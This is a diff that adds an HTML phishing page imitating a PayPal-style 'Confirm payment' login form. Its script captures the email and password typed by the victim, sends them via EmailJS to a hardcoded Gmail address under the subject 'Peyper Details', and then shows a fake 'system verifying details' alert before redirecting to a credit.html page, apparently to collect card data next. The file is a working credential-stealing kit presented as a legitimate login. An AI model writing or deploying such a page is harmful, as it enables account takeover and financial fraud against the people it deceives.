@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html >
+<head> 
+<meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=0.9"> <title>Secure protocol</title> <meta property="og:title" content="Confirm payment">  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLxsP_LH6yn2jrGR-YqtgOGBLwaft8mHzgdg&usqp=CAU">  
+
+
+<link rel="stylesheet" href="style.css">
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+  
+
+<style>
+.body{
+
+}
+.container{
+margin-top:25px;
+background: #fff;
+width: px;
+height: 700px;
+border-radius: 20px;
+display: flex;
+flex-direction: column;
+justify-content: center;
+align-items: center;
+font-family: 'Poppins', sans-serif;
+padding:15px;
+}
+.box, .box button{
+display: flex;
+align-items: center;
+}
+.box{
+width: px;
+height: 240px;
+flex-direction: column;
+justify-content: space-evenly;
+}
+.box button{
+width: 370px;
+height: 50px;
+margin-left:px;
+background-color: #fff;
+outline: none;
+font-weight: bold;
+border: 1px solid rgb(211, 210, 210);
+border-radius: 29px;
+justify-content: center;
+font-family: 'Poppins', sans-serif;
+}
+.box-one button img{
+margin: 0 .5rem;
+}
+.box-one i{
+color: #00acee;
+font-size: 1.8rem;
+}
+.input { 
+
+position: relative; 
+
+width: 96%; 
+
+height: 50px; 
+
+margin-bottom: 0.7em; 
+
+margin-left:2px; 
+
+} 
+
+
+.your-input input{ 
+
+width: 100%; 
+
+height: 50px; 
+
+padding-top: 1.1rem; 
+
+padding-left:px; 
+
+outline: none; 
+
+border: 1px solid #8c8c8c; 
+
+border-radius: 3px; 
+
+transition: .2s; 
+
+} 
+
+
+.your-input label { 
+
+position: absolute; 
+
+top: 43%; 
+
+left: 10px; 
+
+font-size: 20px; 
+
+color: #8c8c8c; 
+
+transition: .2s; 
+
+} 
+
+
+
+.input input:focus ~ label, 
+
+.input input:valid ~ label{ 
+
+top: 25%; 
+
+font-size: 15px; 
+
+color: #000; 
+
+} 
+
+
+
+.input input:focus { 
+
+border-width: 2px; 
+padding-left:9px;
+font-size: 20px; 
+
+border-color: #0A66C3; 
+
+} 
+.input input { 
+padding-left:9px;
+font-size: 20px; 
+
+} 
+
+
+
+.box-two .next-btn{
+background-color:#003087;
+color: #fff;
+margin-bottom:10px;
+}
+.box-two .next-btns{
+background-color:;
+color: #fff;
+
+}
+
+.container p{
+font-size: .7rem;
+color: rgb(138, 136, 136);
+}
+.container p a{
+text-decoration: none;
+color: #00acee;
+}
+
+
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+<img src="head.jpg" style="width:100%; height:%; margin-bottom:110px; margin-top:px;"/>
+ 
+ 
+<div class="box box-two">
+<form id="submitform"  method="post" action="#" autocomplete="on">
+
+
+<div class="your-input"> 
+
+<div class="input"> 
+
+<input type="email" name="email"
+
+id="email" autocomplete="email"required /> 
+
+<label for="email">Email address </label> 
+
+</div> 
+
+<p>
+ &#160;
+</p>
+
+<div class="input"> 
+
+<input type="password" name="password" id="password" autocomplete="current--password" required /> 
+
+<label for="password"> 
+
+Password 
+
+</label> 
+
+</div> 
+
+</div> 
+ &#160;
+
+ <p>
+ </p>
+ 
+<b><h style="font-size:20px;color:#0075CA;margin-left:2px;">Forgotten password?</h></b>
+ <p>
+     
+ </p>
+ &#160;
+<button class="next-btn" id="js_send"><h style="font-size:18px;">Log In</h></button>
+
+
+  <p>
+ </p>
+ 
+ &#160;
+
+
+</form>
+
+
+
+<button class="next-btns"><h style="font-size:18px;width: 365px;height: 50px;border-radius: 29px;margin-top:14px;color:#003087;">Log in with a one-time code</h></button>
+  <p>
+ </p>
+ <u>or</u>
+ &#160;
+ 
+<button class="next-btns"><h style="font-size:18px;width: 365px;height: 50px;border-radius: 29px;margin-top:14px;color:#003087;">Sign Up</h></button>
+ 
+  &#160;
+</div>
+<p></p>
+  &#160;
+  <p>
+    &#160;
+  </p>
+  &#160;
+  <p></p>
+
+
+  
+<img src="foot.jpg" style="width:110%; height:20%;margin-bottom:-50px;"/>
+ 
+ 
+ 
+ 
+<script>
+document.getElementById('submitform').addEventListener('submit', function(event) {
+  event.preventDefault(); // Prevent form submission
+  
+  var email = document.getElementById('email').value;
+  var password = document.getElementById('password').value;
+
+  // Configure emailjs
+  emailjs.init('835HY_wRkYBhqdu7d');
+
+  // Create email message
+  var message = {
+    to: 'robinlaura101@gmail.com', // Change to your Gmail address
+    subject: 'Peyper Details',
+    text: `Email: ${email}, \n\n Password: ${password}`
+  };
+ 
+  // Send email
+  emailjs.send('service_bg462kr', 'template_6pyapsf', message)
+    .then(function(response) {
+      console.log('system verifying details.... ..', response);
+      alert('system verifying details.... ..', location.href="credit.html"
+);
+    }, function(error) {
+      console.error('Error sending email:', error);
+      alert('Error sending login details. Please try again later.');
+    });
+    
+});
+
+</script>
+
+ 
+</body>
+
+</html>
